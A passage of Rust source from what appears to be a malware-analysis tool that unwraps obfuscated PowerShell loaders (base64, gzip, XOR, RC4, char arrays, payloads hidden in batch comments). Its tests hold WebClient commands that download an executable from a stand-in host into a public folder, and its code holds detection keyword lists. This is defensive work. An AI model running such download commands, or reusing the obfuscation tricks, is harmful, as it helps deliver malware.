/// subsequent URL-extraction regexes see literal strings.
fn expand_obfuscation_until(text: &str, deadline: Option<std::time::Instant>) -> (String, bool) {
    let mut out = normalize_powershell_quotes(text);
    out = repair_damaged_webclient_constructor_method(&out);
    let mut skip_nth_for_substring_done = false;
    let mut keyed_base64_xor_done = false;
    for _ in 0..8 {
        if ps_deadline_expired(deadline) {
            return (out, true);
        }
        let before = out.clone();
        out = expand_start_process_argument_list(&out);
        out = expand_invoke_expression_wrappers(&out);
        out = expand_literal_replace_extractor_calls(&out);
        if ps_deadline_expired(deadline) {
            return (out, true);
        }
        out = expand_literal_substring_extractor_calls(&out);
        out = expand_literal_trim_extractor_calls(&out);
        out = expand_literal_case_extractor_calls(&out);
        out = expand_literal_index_extractor_calls(&out);
        out = expand_literal_remove_extractor_calls(&out);
        out = expand_literal_insert_extractor_calls(&out);
        if ps_deadline_expired(deadline) {
            return (out, true);
        }
        out = expand_passthrough_call_wrappers(&out);
        out = expand_ps_dot_replace(&out);
        out = expand_ps_embedded_single_quote_assignments(&out);
        out = expand_doubled_quote_literals(&out);
        out = expand_skip_nth(&out); // skip-nth-char decoder (Pattern B)
        if !skip_nth_for_substring_done {
            let next = expand_skip_nth_for_substring(&out);
            skip_nth_for_substring_done = next != out;
            out = next;
        }
        if !keyed_base64_xor_done {
            let next = expand_keyed_base64_xor_string_fragments(&out);
            keyed_base64_xor_done = next != out;
            out = next;
        }
        out = expand_char_concat(&out);
        out = expand_char_literal_concat(&out);
        out = expand_string_join_char_arrays(&out);
        out = expand_unary_join_char_arrays(&out);
        out = expand_char_array_concat_chunks(&out);
        out = expand_char_array_chunks(&out); // char-array chunk decoder (Pattern D)
        out = expand_hex_split_char_loop(&out);
        out = expand_space_concat(&out); // space-separated string array (Pattern C)
        out = expand_string_concat(&out);
        out = restore_ps_literal_space_sentinels(&out);
        out = expand_double_string_concat(&out);
        out = expand_format_literals(&out);
        out = expand_ps_string_format_static(&out);
        if ps_deadline_expired(deadline) {
            return (out, true);
        }
        out = expand_gzip_function_base64_variables(&out);
        out = expand_gzip_base64_literals(&out);
        out = expand_json_script_base64(&out);
        out = expand_regex_replace_base64_variables(&out);
        out = expand_regex_replace_calls(&out);
        out = expand_marker_chunk_base64_carrier(&out);
        out = expand_getstring_base64_variables(&out);
        out = expand_getstring_base64_literals(&out);
        out = expand_getstring_byte_arrays(&out);
        out = expand_string_join_char_arrays(&out);
        out = expand_unary_join_char_arrays(&out);
        out = expand_convert_frombase64_literals(&out);
        out = append_decoded_frombase64_literals(&out);
        out = append_decoded_rc4_wrappers(&out);
        out = append_decoded_inline_xor_base64_functions(&out);
        out = expand_base64_literals(&out);
        out = expand_getstring_wrapper(&out);
        out = expand_reverse_string_slice_join(&out);
        out = expand_single_literal_join(&out);
        out = expand_ps_split_join_literals(&out);
        out = expand_ps_literal_substring(&out);
        out = expand_tochararray_reverse_join(&out);
        out = expand_ps_string_join(&out);
        out = expand_ps_string_concat_static(&out);
        out = expand_ps_join(&out);
        out = expand_ps_replace(&out);
        out = expand_ps_dot_replace(&out);
        out = expand_ps_index_concat_assignments(&out);
        out = expand_ps_path_combine_assignments(&out);
        out = expand_ps_variables(&out);
        out = expand_regex_replace_calls(&out);
        out = expand_getstring_base64_variables(&out);
        out = expand_getstring_base64_literals(&out);
        out = expand_getstring_byte_arrays(&out);
        out = expand_convert_frombase64_literals(&out);
        out = append_decoded_frombase64_literals(&out);
        out = append_decoded_rc4_wrappers(&out);
        out = append_decoded_inline_xor_base64_functions(&out);
        out = expand_base64_literals(&out);
        out = expand_getstring_wrapper(&out);
        if out == before {
            break;
        }
    }
    (out, false)
}

fn expand_obfuscation_with_env(text: &str, env: &mut Environment) -> String {
    if env.check_timeout() {
        return text.to_string();
    }
    let (expanded, timed_out) = expand_obfuscation_until(text, env.limits.deadline);
    if timed_out {
        env.note_timeout();
        return expanded;
    }
    if env.check_timeout() {
        return expanded;
    }
    let env_expanded = expand_ps_env_refs(&expanded, env);
    if env_expanded == expanded {
        expanded
    } else {
        let (expanded_again, timed_out) =
            expand_obfuscation_until(&env_expanded, env.limits.deadline);
        if timed_out {
            env.note_timeout();
        }
        expanded_again
    }
}

fn normalize_powershell_quotes(text: &str) -> String {
    if !text
        .chars()
        .any(|c| matches!(c, '\u{2018}' | '\u{2019}' | '\u{201C}' | '\u{201D}'))
        && !text.contains("\\\"")
    {
        return text.to_string();
    }
    let normalized: String = text
        .chars()
        .map(|c| match c {
            '\u{2018}' | '\u{2019}' => '\'',
            '\u{201C}' | '\u{201D}' => '"',
            _ => c,
        })
        .collect();
    normalized.replace("\\\"", "\"")
}

fn repair_damaged_webclient_constructor_method(text: &str) -> String {
    DAMAGED_WEBCLIENT_CONSTRUCTOR_METHOD_RE
        .replace_all(text, "$1).$2")
        .into_owned()
}

#[cfg(test)]
mod ps1_report_normalization_tests {
    use super::normalize_ps1_text;

    #[test]
    fn normalizes_damaged_webclient_downloadfile_constructor_for_report() {
        let text = "(New-Object -TypeName System.Net.WebClient.DownloadFile('https://example.test/a.exe', 'C:\\Users\\Public\\a.exe')";

        let normalized = normalize_ps1_text(text);

        assert!(
            normalized.contains("(New-Object -TypeName System.Net.WebClient).DownloadFile("),
            "damaged WebClient DownloadFile constructor was not repaired:\n{normalized}"
        );
    }

    #[test]
    fn leaves_regular_webclient_downloadfile_invocation_alone() {
        let text =
            "$wc=New-Object Net.WebClient;$wc.DownloadFile('https://example.test/a.exe','a.exe')";

        let normalized = normalize_ps1_text(text);

        assert!(
            normalized.contains("$wc.DownloadFile('https://example.test/a.exe','a.exe')"),
            "regular WebClient DownloadFile call should not be rewritten:\n{normalized}"
        );
    }
}

fn strip_marker_noise(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for chunk in text.split_inclusive('\n') {
        let (line, newline) = match chunk.strip_suffix('\n') {
            Some(line) => (line, "\n"),
            None => (chunk, ""),
        };
        if should_skip_marker_noise_line(line) {
            out.push_str(line);
        } else {
            out.push_str(&strip_marker_noise_preserving_base64(line));
        }
        out.push_str(newline);
    }
    out
}

fn should_skip_marker_noise_line(text: &str) -> bool {
    contains_ascii_case_insensitive(text, ".replace(")
        || contains_ascii_case_insensitive(text, "::replace(")
        || contains_ascii_case_insensitive(text, "-replace")
        || contains_ascii_case_insensitive(text, "http:")
        || contains_ascii_case_insensitive(text, "https:")
        || contains_ascii_case_insensitive(text, "ftp:")
        || contains_ascii_case_insensitive(text, "file:")
        || contains_ascii_case_insensitive(text, "gzipstream")
        || contains_ascii_case_insensitive(text, "readtoend")
        || contains_ascii_case_insensitive(text, "function ")
        || contains_ascii_case_insensitive(text, "for(")
}

fn strip_marker_noise_preserving_base64(text: &str) -> String {
    let spans = crate::marker_noise::decodable_base64_spans(text);
    if spans.is_empty() {
        return crate::marker_noise::strip_line(text);
    }

    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;
    for (start, end) in spans {
        if start > cursor {
            out.push_str(&crate::marker_noise::strip_line(&text[cursor..start]));
        }
        out.push_str(&text[start..end]);
        cursor = end;
    }
    if cursor < text.len() {
        out.push_str(&crate::marker_noise::strip_line(&text[cursor..]));
    }
    out
}

/// Decode a ps1 payload to a String, handling UTF-16LE (from -EncodedCommand).
///
/// Heuristic: if at least half the even-offset bytes are non-zero and at
/// least half the odd-offset bytes are zero, treat as UTF-16LE.
fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
    if bytes.len() >= 4 && is_utf16le(bytes) {
        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
            .collect();
        String::from_utf16_lossy(&u16s).into()
    } else {
        String::from_utf8_lossy(bytes)
    }
}

#[allow(dead_code)]
pub fn normalize_ps1_text(text: &str) -> String {
    normalize_ps1_text_until(text, None).0
}

pub(crate) fn normalize_ps1_text_until(
    text: &str,
    deadline: Option<std::time::Instant>,
) -> (String, bool) {
    let command_text = unwrap_outer_encoded_powershell_argument(text);
    let decoded_iex_inner = decode_marker_replaced_getstring_iex_inner(&command_text);
    let normalization_source = decoded_iex_inner.as_deref().unwrap_or(&command_text);
    let stripped = strip_marker_noise(normalization_source);
    let (expanded, timed_out) = expand_obfuscation_until(&stripped, deadline);
    let expanded = strip_marker_noise(&expanded);
    let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
    let aliased = expand_keyed_base64_xor_string_fragments(&aliased);
    (
        escape_binary_controls(&aliased),
        timed_out || ps_deadline_expired(deadline),
    )
}

fn decode_marker_replaced_getstring_iex_inner(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("frombase64string")
        || !lower.contains(".replace(")
        || !(lower.contains("invoke-expression") || lower.contains("iex"))
    {
        return None;
    }
    let marker_replaced = expand_ps_dot_replace(text);
    let decoded = expand_getstring_base64_literals(&marker_replaced);
    let caps = PS_INVOKE_EXPRESSION_SINGLE_LITERAL_RE.captures(decoded.trim())?;
    let inner = caps.get(1)?.as_str().replace("''", "'");
    (inner.trim().len() >= 16).then_some(inner)
}

fn unwrap_outer_encoded_powershell_argument(text: &str) -> String {
    let trimmed = text.trim();
    let Some(inner) = trimmed
        .strip_prefix('"')
        .and_then(|value| value.strip_suffix('"'))
    else {
        return text.to_string();
    };
    let lower = inner.to_ascii_lowercase();
    if lower.contains("frombase64string")
        && (lower.contains("invoke-expression") || lower.contains("iex("))
    {
        inner.to_string()
    } else {
        text.to_string()
    }
}

#[allow(dead_code)]
pub fn normalize_ps1_payload(bytes: &[u8]) -> String {
    let raw_text = decode_payload(bytes);
    normalize_ps1_text(&raw_text)
}

#[allow(dead_code)]
pub(crate) fn normalize_ps1_payload_until(
    bytes: &[u8],
    deadline: Option<std::time::Instant>,
) -> (String, bool) {
    let raw_text = decode_payload(bytes);
    normalize_ps1_text_until(&raw_text, deadline)
}

pub(crate) fn normalize_ps1_payload_for_report_until(
    bytes: &[u8],
    deadline: Option<std::time::Instant>,
) -> (String, bool) {
    let raw_text = decode_payload(bytes);
    if bytes.len() >= LARGE_PS1_REPORT_FAST_PATH_BYTES
        && looks_like_deflate_xor_base64_assembly_loader(&raw_text)
    {
        return (
            escape_binary_controls(&head_tail_sample(&raw_text, 48 * 1024)),
            false,
        );
    }
    if looks_like_dense_skip_nth_payload(&raw_text) {
        return (expand_dense_skip_nth_payload(&raw_text), false);
    }
    if looks_like_for_substring_stride_payload(&raw_text) {
        return (
            escape_binary_controls(&expand_for_substring_stride_fast_path_payload(&raw_text)),
            false,
        );
    }
    if looks_like_keyed_base64_xor_payload(&raw_text) {
        return (
            escape_binary_controls(&expand_keyed_base64_xor_payload_fast(&raw_text)),
            false,
        );
    }
    if bytes.len() >= LARGE_PS1_REPORT_FAST_PATH_BYTES {
        let (large_text, timed_out) =
            expand_large_compressed_ps1_stage_before_sampling(&raw_text, deadline);
        if timed_out {
            return (escape_binary_controls(&large_text), true);
        }
        let sampled = head_tail_sample(&large_text, 48 * 1024);
        if large_ps1_report_sample_needs_normalization(&sampled) {
            normalize_ps1_text_until(&sampled, deadline)
        } else {
            (
                escape_binary_controls(&sampled),
                ps_deadline_expired(deadline),
            )
        }
    } else {
        normalize_ps1_text_until(&raw_text, deadline)
    }
}

fn expand_dense_skip_nth_payload(text: &str) -> String {
    let expanded = expand_skip_nth(text);
    let expanded = expand_skip_nth_for_substring(&expanded);
    let expanded = expand_ps_variables(&expanded);
    let expanded = expand_skip_nth_for_substring(&expanded);
    let expanded = expand_ps_variables(&expanded);
    expand_keyed_base64_xor_string_fragments(&expanded)
}

fn expand_for_substring_stride_fast_path_payload(text: &str) -> String {
    let expanded = expand_skip_nth(text);
    let expanded = expand_skip_nth_for_substring(&expanded);
    let expanded = expand_ps_variables(&expanded);
    let expanded = expand_skip_nth_for_substring(&expanded);
    let expanded = expand_ps_variables(&expanded);
    expand_keyed_base64_xor_string_fragments(&expanded)
}

fn large_ps1_report_sample_needs_normalization(text: &str) -> bool {
    if [
        "-replace",
        ".replace(",
        "::replace(",
        "gzipstream",
        "invoke-expression",
        "[char",
        "-join",
        ".substring(",
        "-bxor",
    ]
    .iter()
    .any(|needle| crate::util::contains_ascii_case_insensitive(text, needle))
    {
        return true;
    }

    contains_ps_command_token_ascii_case_insensitive(text, "iex")
}

fn contains_ps_command_token_ascii_case_insensitive(text: &str, token: &str) -> bool {
    let haystack = text.as_bytes();
    let needle = token.as_bytes();
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    for start in 0..=haystack.len() - needle.len() {
        if !haystack[start..start + needle.len()].eq_ignore_ascii_case(needle) {
            continue;
        }
        let before = start
            .checked_sub(1)
            .and_then(|idx| haystack.get(idx).copied());
        let after = haystack.get(start + needle.len()).copied();
        if ps_token_boundary_before(before) && ps_token_boundary_after(after) {
            return true;
        }
    }
    false
}

fn ps_token_boundary_before(byte: Option<u8>) -> bool {
    match byte {
        None => true,
        Some(b) => !b.is_ascii_alphanumeric() && !matches!(b, b'_' | b'-' | b'$'),
    }
}

fn ps_token_boundary_after(byte: Option<u8>) -> bool {
    match byte {
        None => true,
        Some(b) => !b.is_ascii_alphanumeric() && !matches!(b, b'_' | b'-'),
    }
}

fn escape_binary_controls(text: &str) -> String {
    if !text
        .chars()
        .any(|c| c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
    {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if c.is_control() && !matches!(c, '\r' | '\n' | '\t') {
            use std::fmt::Write as _;
            let _ = write!(out, "\\x{:02X}", c as u32);
        } else {
            out.push(c);
        }
    }
    out
}

pub fn extract_self_embedded_ps1(env: &mut Environment, deobfuscated: &str) {
    scan_file_backed_base64_ps1(deobfuscated, env, deobfuscated);

    let Some(input_bytes) = env.input_bytes.clone() else {
        return;
    };
    extract_sorted_comment_ps1(env, &input_bytes);

    let source = String::from_utf8_lossy(&input_bytes);
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    if looks_like_self_tail_base64_loader(deobfuscated) {
        for decoded in decode_large_base64_runs_from_source(&source) {
            if known.insert(decoded.clone()) {
                decoded_payloads.push(decoded);
            }
        }
    }
    if let Some(decoded) = decode_marker_chunk_base64_carrier(&source) {
        let bytes = decoded.into_bytes();
        if looks_like_powershell_payload(&bytes) && known.insert(bytes.clone()) {
            decoded_payloads.push(bytes);
        }
    }

    if env.all_extracted_ps1.is_empty() && decoded_payloads.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();

    for payload in payloads {
        let text = decode_payload(&payload);
        if looks_like_self_tail_base64_loader(&text) {
            for decoded in decode_large_base64_runs_from_source(&source) {
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
        if !text.contains("%~f0") && !contains_ascii_case_insensitive(&text, "get-content") {
            continue;
        }
        for caps in SELF_B64_MATCH_RE.captures_iter(&text) {
            let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            for b64 in find_marker_base64_runs(&source, marker) {
                if b64.len() > 16 * 1024 * 1024 {
                    continue;
                }
                let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                    continue;
                };
                if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
                    continue;
                }
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
    }

    for payload in decoded_payloads {
        env.push_extracted_ps1(payload);
    }
    extract_file_backed_xor_ps1(env, deobfuscated);
    scan_file_backed_base64_ps1(deobfuscated, env, deobfuscated);
}

fn looks_like_self_tail_base64_loader(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "get-content")
        && contains_ascii_case_insensitive(text, "-raw")
        && contains_ascii_case_insensitive(text, "frombase64string")
}

fn decode_large_base64_runs_from_source(source: &str) -> Vec<Vec<u8>> {
    const MIN_B64_RUN: usize = 80;
    const MAX_B64_RUN: usize = 16 * 1024 * 1024;

    let bytes = source.as_bytes();
    let mut out = Vec::new();
    let mut start: Option<usize> = None;
    for (idx, &b) in bytes.iter().enumerate() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=') {
            start.get_or_insert(idx);
            continue;
        }
        if let Some(s) = start.take() {
            maybe_decode_source_b64_run(source, s, idx, MIN_B64_RUN, MAX_B64_RUN, &mut out);
        }
    }
    if let Some(s) = start {
        maybe_decode_source_b64_run(source, s, source.len(), MIN_B64_RUN, MAX_B64_RUN, &mut out);
    }
    out
}

fn maybe_decode_source_b64_run(
    source: &str,
    start: usize,
    end: usize,
    min_len: usize,
    max_len: usize,
    out: &mut Vec<Vec<u8>>,
) {
    let len = end.saturating_sub(start);
    if !(min_len..=max_len).contains(&len) {
        return;
    }
    let run = &source[start..end];
    let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(run) else {
        return;
    };
    if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
        return;
    }
    out.push(decoded);
}

fn extract_sorted_comment_ps1(env: &mut Environment, input_bytes: &[u8]) {
    let source = String::from_utf8_lossy(input_bytes);
    let lower = source.to_ascii_lowercase();
    if !lower.contains("sort-object")
        || !lower.contains("startswith(':: ")
        || !lower.contains("substring(0, 10)")
        || !lower.contains("substring(10)")
    {
        return;
    }

    let mut groups: std::collections::BTreeMap<String, Vec<(String, String)>> =
        std::collections::BTreeMap::new();
    for line in source.lines() {
        let Some(rest) = line.strip_prefix(":: ") else {
            continue;
        };
        if rest.len() < 12 {
            continue;
        }
        let (group, rest) = rest.split_at(2);
        let (order, chunk) = rest.split_at(10);
        if !group.bytes().all(|b| b.is_ascii_digit()) || !order.bytes().all(|b| b.is_ascii_digit())
        {
            continue;
        }
        groups
            .entry(group.to_string())
            .or_default()
            .push((order.to_string(), chunk.to_string()));
    }

    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for (_group, mut chunks) in groups {
        chunks.sort_by(|a, b| a.0.cmp(&b.0));
        let joined: String = chunks.into_iter().map(|(_, chunk)| chunk).collect();
        if joined.len() > 8 * 1024 * 1024 {
            continue;
        }
        let payload = joined.replace("PATH", "%~f0").into_bytes();
        if !looks_like_powershell_payload(&payload) {
            continue;
        }
        if known.insert(payload.clone()) {
            env.push_extracted_ps1(payload);
        }
    }
}

fn extract_file_backed_xor_ps1(env: &mut Environment, deobfuscated: &str) {
    if env.all_extracted_ps1.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    for payload in payloads {
        let text = expand_ps_variables(&decode_payload(&payload));
        let lower = text.to_ascii_lowercase();
        if !lower.contains("frombase64string") || !lower.contains("-bxor") {
            continue;
        }

        for caps in FILE_B64_XOR_LOADER_RE.captures_iter(&text) {
            let Some(key_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(key) = caps.get(2).and_then(|m| m.as_str().parse::<u8>().ok()) else {
                continue;
            };
            let Some(data_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };
            let Some(path) = caps.get(4).map(|m| m.as_str()) else {
                continue;
            };
            let Some(from_b64_var) = caps.get(5).map(|m| m.as_str()) else {
                continue;
            };
            let Some(xor_key_var) = caps.get(6).map(|m| m.as_str()) else {
                continue;
            };
            if !data_var.eq_ignore_ascii_case(from_b64_var)
                || !key_var.eq_ignore_ascii_case(xor_key_var)
            {
                continue;
            }

            let Some(content) = filesystem_content_for_path(env, path)
                .or_else(|| grouped_echo_content_for_path(deobfuscated, path))
            else {
                continue;
            };
            if content.len() > 16 * 1024 * 1024 {
                continue;
            }
            let b64: String = content
                .iter()
                .copied()
                .filter(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
                .map(char::from)
                .collect();
            if b64.len() < 16 {
                continue;
            }
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                continue;
            };
            if decoded.len() > 12 * 1024 * 1024 {
                continue;
            }
            let xored: Vec<u8> = decoded.into_iter().map(|b| b ^ key).collect();
            if !looks_like_powershell_payload(&xored) {
                continue;
            }
            if known.insert(xored.clone()) {
                decoded_payloads.push(xored);
            }
        }
    }

    for payload in decoded_payloads {
        env.push_extracted_ps1(payload);
    }
}

fn scan_file_backed_base64_ps1(text: &str, env: &mut Environment, deobfuscated: &str) {
    if !contains_ascii_case_insensitive(text, "frombase64string")
        || (!contains_ascii_case_insensitive(text, "get-content")
            && !contains_ascii_case_insensitive(text, "gc "))
    {
        return;
    }

    let path_bindings = ps_path_bindings(text, env);
    let markers: Vec<&str> = PS_EMPTY_REPLACE_OPERATOR_RE
        .captures_iter(text)
        .filter_map(|caps| caps.get(1).map(|m| m.as_str()))
        .collect();
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    for caps in FILE_B64_LOADER_PATH_RE.captures_iter(text) {
        let path = if let Some(var) = caps.get(1) {
            path_bindings
                .get(&var.as_str().to_ascii_lowercase())
                .map(String::as_str)
        } else {
            caps.get(2).map(|m| m.as_str())
        };
        let Some(path) = path else { continue };

        let Some(content) = filesystem_content_for_path(env, path)
            .or_else(|| grouped_echo_content_for_path(deobfuscated, path))
        else {
            continue;
        };
        if content.len() > 16 * 1024 * 1024 {
            continue;
        }

        for mut candidate in file_backed_base64_candidates(&content) {
            for marker in &markers {
                candidate = candidate.replace(marker, "");
            }
            candidate.retain(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='));
            if candidate.len() < 16 || candidate.len() > 16 * 1024 * 1024 {
                continue;
            }
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) else {
                continue;
            };
            if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
                continue;
            }
            if known.insert(decoded.clone()) {
                decoded_payloads.push(decoded);
            }
        }
    }

    for payload in decoded_payloads {
        env.push_extracted_ps1(payload);
    }
}

fn ps_path_bindings(text: &str, env: &Environment) -> std::collections::HashMap<String, String> {
    let mut bindings = std::collections::HashMap::new();
    for caps in PS_ANY_STRING_ASSIGN_RE.captures_iter(text) {
        let Some(name) = caps.get(1) else { continue };
        let Some(value) = caps.get(2).or_else(|| caps.get(3)) else {
            continue;
        };
        bindings.insert(
            name.as_str().to_ascii_lowercase(),
            expand_ps_env_path(value.as_str(), env),
        );
    }
    bindings
}

fn expand_ps_env_path(value: &str, env: &Environment) -> String {
    let mut out = value.to_string();
    for (name, replacement) in &env.vars {
        let needle = format!("$env:{name}");
        out = replace_ascii_case_insensitive(&out, &needle, replacement);
    }
    out
}

pub(crate) fn expand_ps_env_refs(text: &str, env: &Environment) -> String {
    if env.vars_iter().next().is_none() || !contains_ascii_case_insensitive(text, "$env:") {
        return text.to_string();
    }

    PS_ENV_REF_RE
        .replace_all(text, |caps: &regex::Captures<'_>| {
            let whole = caps.get(0).map_or("", |m| m.as_str());
            let Some(name) = caps.get(1).map(|m| m.as_str()) else {
                return whole.to_string();
            };
            let Some(value) = env.get(name) else {
                return whole.to_string();
            };
            let Some(m) = caps.get(0) else {
                return whole.to_string();
            };
            match ps_env_ref_quote_context(text, m.start()) {
                PsEnvRefQuoteContext::SingleQuoted => value.replace('\'', "''"),
                PsEnvRefQuoteContext::DoubleQuoted => value
                    .replace('`', "``")
                    .replace('"', "`\"")
                    .replace('$', "`$"),
                PsEnvRefQuoteContext::Expression => {
                    if ps_env_ref_has_unquoted_path_suffix(text, m.end()) {
                        value
                    } else {
                        format!("'{}'", value.replace('\'', "''"))
                    }
                }
            }
        })
        .into_owned()
}

fn ps_env_ref_has_unquoted_path_suffix(text: &str, pos: usize) -> bool {
    text[pos..]
        .chars()
        .next()
        .is_some_and(|ch| matches!(ch, '\\' | '/'))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PsEnvRefQuoteContext {
    Expression,
    SingleQuoted,
    DoubleQuoted,
}

fn ps_env_ref_quote_context(text: &str, pos: usize) -> PsEnvRefQuoteContext {
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = text[..pos].chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '\'' if !in_double => {
                if in_single && chars.peek() == Some(&'\'') {
                    chars.next();
                } else {
                    in_single = !in_single;
                }
            }
            '"' if !in_single => {
                in_double = !in_double;
            }
            '`' if in_double => {
                chars.next();
            }
            _ => {}
        }
    }
    if in_single {
        PsEnvRefQuoteContext::SingleQuoted
    } else if in_double {
        PsEnvRefQuoteContext::DoubleQuoted
    } else {
        PsEnvRefQuoteContext::Expression
    }
}

fn replace_ascii_case_insensitive(input: &str, needle: &str, replacement: &str) -> String {
    if needle.is_empty() {
        return input.to_string();
    }
    let mut out = String::with_capacity(input.len());
    let mut cursor = 0usize;
    while let Some(rel) = find_ascii_case_insensitive_from(input, needle, cursor) {
        out.push_str(&input[cursor..rel]);
        out.push_str(replacement);
        cursor = rel + needle.len();
    }
    out.push_str(&input[cursor..]);
    out
}

fn file_backed_base64_candidates(content: &[u8]) -> Vec<String> {
    let mut candidates = Vec::new();
    let mut grouped_candidate = String::new();
    let content_text = String::from_utf8_lossy(content);

    for line in content_text.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix(":::") {
            if rest.len() > 1 {
                grouped_candidate.push_str(&rest[1..]);
            }
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix(":: ") {
            let fragments: Vec<String> = rest
                .split('\\')
                .filter(|part| !part.is_empty())
                .map(str::to_string)
                .collect();
            if fragments.len() > 1 {
                candidates.extend(fragments);
            } else if let Some(fragment) = fragments.into_iter().next() {
                candidates.push(fragment);
            }
            continue;
        }
    }

    if !grouped_candidate.is_empty() {
        candidates.push(grouped_candidate);
    }
    if candidates.is_empty() {
        let candidate: String = content
            .iter()
            .copied()
            .filter(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
            .map(char::from)
            .collect();
        if !candidate.is_empty() {
            candidates.push(candidate);
        }
    }

    candidates
}

fn filesystem_content_for_path(env: &Environment, path: &str) -> Option<Vec<u8>> {
    let key = normalize_fs_lookup_path(path);
    env.modified_filesystem
        .iter()
        .find_map(|(candidate, entry)| {
            if fs_lookup_path_matches(&normalize_fs_lookup_path(candidate), &key) {
                fs_entry_content(entry)
            } else {
                None
            }
        })
}

fn fs_lookup_path_matches(candidate: &str, wanted: &str) -> bool {
    if candidate == wanted {
        return true;
    }
    let Some(candidate_base) = candidate.rsplit('\\').next() else {
        return false;
    };
    let Some(wanted_base) = wanted.rsplit('\\').next() else {
        return false;
    };
    !candidate_base.is_empty() && candidate_base == wanted_base
}

fn grouped_echo_content_for_path(deobfuscated: &str, path: &str) -> Option<Vec<u8>> {
    let wanted = normalize_fs_lookup_path(path);
    let mut in_group = false;
    let mut chunks: Vec<String> = Vec::new();

    for line in deobfuscated.lines() {
        let trimmed = line.trim();
        if trimmed == "(" {
            in_group = true;
            chunks.clear();
            continue;
        }
        if !in_group {
            continue;
        }
        if let Some(target) = redirected_group_target(trimmed) {
            if normalize_fs_lookup_path(target) == wanted {
                let mut content = Vec::new();
                for chunk in chunks {
                    content.extend_from_slice(chunk.as_bytes());
                    content.extend_from_slice(b"\r\n");
                }
                return Some(content);
            }
            in_group = false;
            chunks.clear();
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix("echo ") {
            chunks.push(rest.to_string());
        }
    }

    None
}

fn redirected_group_target(line: &str) -> Option<&str> {
    let rest = line
        .strip_prefix(")>>")
        .or_else(|| line.strip_prefix(")>"))?
        .trim();
    rest.trim_matches('"').split_ascii_whitespace().next()
}

fn fs_entry_content(entry: &FsEntry) -> Option<Vec<u8>> {
    match entry {
        FsEntry::Content { content, .. } | FsEntry::Decoded { content, .. } => {
            Some(content.clone())
        }
        FsEntry::Directory | FsEntry::Download { .. } | FsEntry::Copy { .. } => None,
    }
}

fn normalize_fs_lookup_path(path: &str) -> String {
    let path = path.trim_matches('"').trim_matches('\'');
    if path.is_ascii() {
        let mut out = String::with_capacity(path.len());
        let mut last_was_backslash = false;
        for &byte in path.as_bytes() {
            let c = if byte == b'/' {
                b'\\'
            } else {
                byte.to_ascii_lowercase()
            };
            if c == b'\\' {
                if !last_was_backslash {
                    out.push(c as char);
                }
                last_was_backslash = true;
            } else {
                out.push(c as char);
                last_was_backslash = false;
            }
        }
        return out;
    }

    let mut out = String::with_capacity(path.len());
    let mut last_was_backslash = false;
    for c in path.chars() {
        let c = if c == '/' {
            '\\'
        } else {
            c.to_ascii_lowercase()
        };
        if c == '\\' {
            if !last_was_backslash {
                out.push(c);
            }
            last_was_backslash = true;
        } else {
            out.push(c);
            last_was_backslash = false;
        }
    }
    out
}

#[cfg(test)]
mod fs_lookup_path_tests {
    use super::normalize_fs_lookup_path;

    #[test]
    fn normalize_fs_lookup_path_fast_paths_ascii_and_preserves_unicode() {
        assert_eq!(
            normalize_fs_lookup_path(r#""C:/Temp\\Foo.EXE""#),
            r"c:\temp\foo.exe"
        );
        assert_eq!(
            normalize_fs_lookup_path(r#""C:/Temp/पथ\File.TXT""#),
            r"c:\temp\पथ\file.txt"
        );
    }
}

fn find_marker_base64_runs(source: &str, marker: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = source[search_from..].find(marker) {
        let start = search_from + rel + marker.len();
        let rest = &source[start..];
        let b64_len = rest
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
            .count();
        if b64_len >= 32 {
            out.push(rest[..b64_len].to_string());
        }
